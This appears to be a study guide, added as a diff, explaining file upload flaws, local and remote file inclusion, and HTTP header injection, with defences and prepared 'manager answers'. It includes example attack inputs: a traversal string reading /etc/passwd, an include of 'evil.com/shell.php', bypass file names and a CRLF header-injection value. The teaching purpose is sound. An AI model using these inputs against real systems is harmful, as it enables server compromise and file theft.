@@ -1,0 +1,524 @@
+BLOCK C — Web Application Exploitation
+
+Objective: Learn how attackers exploit weaknesses in web applications after reaching the application.
+
+Topics:
+
+1. Unrestricted File Upload
+
+
+2. File Inclusion Vulnerabilities (LFI/RFI)
+
+
+3. Header Injection
+
+
+
+
+---
+
+1. Unrestricted File Upload
+
+What is it?
+
+Many applications allow users to upload files:
+
+Profile picture
+
+Resume
+
+PDF
+
+Documents
+
+
+If the server doesn't properly validate uploads, an attacker can upload malicious files.
+
+
+---
+
+Example
+
+Normal user uploads:
+
+resume.pdf
+
+Attacker uploads:
+
+shell.php
+
+If the server executes PHP files,
+
+the attacker can run commands on the server.
+
+This is called a Web Shell.
+
+
+---
+
+Attack Flow
+
+Attacker
+
+↓
+
+Uploads shell.php
+
+↓
+
+Server stores file
+
+↓
+
+Attacker visits
+
+website.com/uploads/shell.php
+
+↓
+
+Server executes PHP
+
+↓
+
+Remote Code Execution (RCE)
+
+
+---
+
+Why is it dangerous?
+
+The attacker may gain:
+
+Server access
+
+Database access
+
+Sensitive files
+
+Command execution
+
+Full system compromise
+
+
+
+---
+
+Why checking file extension is NOT enough
+
+Bad validation:
+
+Allowed:
+
+.jpg
+.png
+.pdf
+
+Attacker uploads:
+
+image.php.jpg
+
+or
+
+shell.pHp
+
+or changes the MIME type.
+
+Extension checking alone can be bypassed.
+
+
+---
+
+Better validation
+
+A secure application checks:
+
+✔ File extension
+
+✔ MIME type
+
+✔ File signature (magic bytes)
+
+✔ Virus scanning
+
+✔ File size
+
+✔ Upload location
+
+
+---
+
+Why validate file CONTENT instead of extension?
+
+This is exactly the question your manager likes.
+
+Because:
+
+Extensions can be renamed.
+
+Actual file contents cannot easily be disguised.
+
+Example
+
+shell.php
+
+↓
+
+Rename
+
+↓
+
+cat.jpg
+
+Extension says JPG.
+
+Content says PHP.
+
+Server should inspect the actual bytes.
+
+
+---
+
+Why store uploads outside the web root?
+
+Web Root:
+
+www.example.com/uploads/
+
+If uploaded here,
+
+the attacker may execute:
+
+shell.php
+
+Outside Web Root:
+
+/var/uploads/
+
+Cannot be accessed directly through the browser.
+
+Application reads the file safely.
+
+
+---
+
+Manager Answer
+
+> We store uploads outside the web root to prevent uploaded files from being directly executed through the web server.
+
+
+
+
+---
+
+2. File Inclusion Vulnerabilities
+
+Applications often load files dynamically.
+
+Example
+
+?page=home
+
+Server
+
+include(home.php)
+
+
+---
+
+If input isn't validated:
+
+?page=../../etc/passwd
+
+Server loads:
+
+/etc/passwd
+
+This is Local File Inclusion (LFI).
+
+
+---
+
+Local File Inclusion (LFI)
+
+Reads files already present on the server.
+
+Examples
+
+/etc/passwd
+
+config.php
+
+logs
+
+keys
+
+
+---
+
+Remote File Inclusion (RFI)
+
+Instead of loading local files,
+
+the application loads files from another server.
+
+Example
+
+include(
+
+http://evil.com/shell.php
+
+)
+
+The attacker controls:
+
+evil.com
+
+Server downloads and executes it.
+
+Very dangerous.
+
+
+---
+
+LFI vs RFI
+
+LFI	RFI
+
+Reads local files	Loads remote files
+Uses server files	Uses attacker files
+May leak data	Often leads to Remote Code Execution
+
+
+
+---
+
+Why is File Inclusion dangerous?
+
+Because attackers can:
+
+Read configuration
+
+Read passwords
+
+Leak API keys
+
+Execute code
+
+Gain server access
+
+
+
+---
+
+Prevention
+
+Never directly trust user input.
+
+Instead:
+
+Allowed Pages
+
+↓
+
+Home
+
+↓
+
+Profile
+
+↓
+
+About
+
+Use a whitelist.
+
+
+---
+
+Manager Answer
+
+Why use whitelists?
+
+Because attackers cannot request arbitrary files if only predefined files are allowed.
+
+
+---
+
+3. Header Injection
+
+Every HTTP response contains headers.
+
+Example
+
+HTTP/1.1 200 OK
+
+Content-Type
+
+Set-Cookie
+
+Location
+
+Cache-Control
+
+If user input is inserted into headers without validation,
+
+attackers can inject new headers.
+
+
+---
+
+Example
+
+Suppose
+
+Location:
+
+/welcome?name=Suresh
+
+Attacker submits
+
+Suresh
+
+Set-Cookie:
+
+admin=true
+
+Now the response becomes corrupted.
+
+
+---
+
+Response Splitting
+
+Attacker injects
+
+CRLF
+
+(Carriage Return + Line Feed)
+
+Creates another response header.
+
+Possible consequences:
+
+Cookie injection
+
+Cache poisoning
+
+Redirects
+
+XSS
+
+
+
+---
+
+Why sanitize headers?
+
+Headers control browser behavior.
+
+If attackers manipulate them,
+
+they can:
+
+Steal sessions
+
+Redirect users
+
+Poison caches
+
+Bypass security controls
+
+
+
+---
+
+Manager Answer
+
+Why sanitize HTTP headers?
+
+Because HTTP headers influence browser behavior, and unvalidated input can allow attackers to inject malicious headers or split responses.
+
+
+---
+
+BLOCK C Summary
+
+Web Application
+
+│
+
+├── File Upload
+
+│     ↓
+
+│     Remote Code Execution
+
+│
+
+├── File Inclusion
+
+│     ↓
+
+│     Read Sensitive Files
+
+│     Execute Code
+
+│
+
+└── Header Injection
+
+      ↓
+
+      Response Splitting
+
+      Cookie Injection
+
+      Redirects
+
+
+---
+
+Manager's "WHY" Questions
+
+Why validate file contents instead of extensions?
+
+Because extensions can be renamed, while inspecting the actual file contents (magic bytes/MIME) provides stronger assurance of the file type.
+
+
+---
+
+Why store uploads outside the web root?
+
+To prevent uploaded files from being directly executed by the web server, reducing the risk of Remote Code Execution.
+
+
+---
+
+Why use a whitelist for file inclusion?
+
+Because it limits file access to known, approved resources and prevents attackers from requesting arbitrary files.
+
+
+---
+
+Why sanitize HTTP headers?
+
+Because untrusted input in headers can lead to response splitting, cache poisoning, malicious redirects, and other attacks.
+
+
+---
+
+Interview Summary
+
+Unrestricted File Upload → Uploading malicious files that can lead to Remote Code Execution.
+
+LFI → Reading or including files already on the server.
+
+RFI → Including attacker-controlled remote files, often leading to code execution.
+
+Header Injection → Manipulating HTTP headers to alter browser or server behavior.
+
+Best Defenses → Validate file content, store uploads outside the web root, use whitelists for file inclusion, and sanitize all header values.
+
+
+These vulnerabilities are common in real-world web applications, and understanding why the defenses work—not just what they are—is exactly the reasoning your manager has been encouraging you to develop.
